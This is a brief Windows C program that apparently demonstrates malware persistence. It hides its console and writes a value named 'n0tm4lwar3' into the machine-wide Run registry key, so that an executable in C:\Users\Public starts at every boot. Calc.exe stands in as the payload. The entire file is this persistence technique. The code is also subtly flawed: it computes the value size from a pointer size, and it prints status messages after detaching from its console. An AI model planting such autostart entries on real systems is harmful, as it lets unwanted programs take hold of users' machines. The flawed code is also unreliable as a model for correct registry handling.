#include <windows.h>
#include <stdio.h>

/*Requires UAC*/

int wmain() {
	FreeConsole();
	LPCWSTR regkey = L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
	HKEY hKey;
	LSTATUS regkeyopen = RegOpenKeyExW(HKEY_LOCAL_MACHINE, regkey, NULL, KEY_ALL_ACCESS, &hKey);
	if (regkeyopen == ERROR_SUCCESS) {
		printf("Success: Key Opened\r\n");
	}
	else {
		printf("Fail: Key Not Opened\r\n");
	}
	LPCWSTR name = L"n0tm4lwar3";
	LPCWSTR path = L"\"C:\\Users\\Public\\calc.exe\"";
	DWORD size = wcslen(path) * sizeof(LPCWSTR);
	LSTATUS regkeyupdate = RegSetValueExW(hKey, name, 0, REG_SZ, (BYTE*)path, size);
	if (regkeyupdate == ERROR_SUCCESS) {
		printf("Success: Value Added\r\n");
	}
	else {
		printf("Fail: Value Not Set\r\n");
	}
}